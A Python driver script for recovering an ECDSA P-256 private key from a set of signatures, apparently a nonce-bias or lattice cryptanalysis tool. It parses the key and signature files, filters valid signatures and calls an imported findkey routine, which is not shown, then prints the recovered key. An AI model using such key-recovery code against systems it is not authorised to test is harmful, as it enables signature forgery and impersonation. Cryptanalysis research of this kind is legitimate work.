#!/usr/bin/env python3

import base64
import sys
import os

from hashlib import sha256
from ec import *


'''
convert the public key file of the signer into two integers
(works for P-256)
'''
def pubkey_to_point(pubkey_filename):
    text = open(pubkey_filename, 'r').read().split('\n')
    pubkey = base64.b64decode(text[1] + text[2])[27:]
    xx, yy = int.from_bytes(pubkey[:32], 'big'), int.from_bytes(pubkey[32:], 'big')
    return xx, yy


'''
convert the raw signature to a couple of integers (r,s)
(works for signatures with P-256)
'''
def sig_to_integer(sig_filename):
    raw = open(sig_filename, 'rb').read()
    rlen = raw[3]
    r = int.from_bytes(raw[4:4+rlen], 'big')
    s = int.from_bytes(raw[6+rlen:], 'big')
    return r, s


'''
convert the signed file to an integer
'''
def msg_to_integer(msg_filename):
    return int.from_bytes(sha256(open(msg_filename, 'rb').read()).digest(), 'big')


'''
import signatures and messages from the given directory
and convert as integers
'''
def import_signatures(list_sig_directory):
    nsig = len(os.listdir(list_sig_directory)) >> 1
    list_sig = []
    for n in range(nsig):
        m = msg_to_integer(list_sig_directory + '/message_{}.txt'.format(n))
        r, s = sig_to_integer(list_sig_directory + '/signature_{}.bin'.format(n))
        list_sig.append((m,r,s))
    return list_sig
            

'''
Recover the private key from the signatures
using the tools of ec.py
'''
def P256_findkey(pubkey_filename, list_sig_directory, verb=False):
    pubkey_point = pubkey_to_point(pubkey_filename)
    list_sig = import_signatures(list_sig_directory)
    valid_signatures = []
    nattempts, nsig_valid, nsig_total = 0, 0, 0
    guess = -1
    
    for sig in list_sig:
        nsig_total += 1
        valid = check_signature(secp256r1, pubkey_point, sig)
        if valid:
            nsig_valid += 1
            valid_signatures.append(sig)

            if verb:
                print('Nb valid signatures: {:2d} / {:4d}'.format(nsig_valid, nsig_total))

            if nsig_valid >= 52:
                nattempts += 1
                if verb:
                    print("Recovering the key, attempt {} with {:2d} signatures...".format(nattempts, nsig_valid))
                guess = findkey(secp256r1, pubkey_point, valid_signatures, True, 5)
                if guess != -1:
                    break

    return guess, nsig_valid, nsig_total
    

def printhelp():
    print('Arguments are:')
    print('   #1: /path/to/publickey')
    print('   #2: /path/to/directory_of_signatures_and_messages')

 
if __name__ == '__main__':
    argc = len(sys.argv) - 1
    if argc != 2:
        printhelp()
        sys.exit()

    guess, nsig_valid, nsig_total = P256_findkey(sys.argv[1], sys.argv[2], verb=True)
     
    if guess != -1:
        print('SUCCESS!\nThe private key is: {:064x}'.format(guess))
    else:
        print('FAILED!')
    print('Nb signatures valid:', nsig_valid)
    print('Nb signatures total:', nsig_total)



    
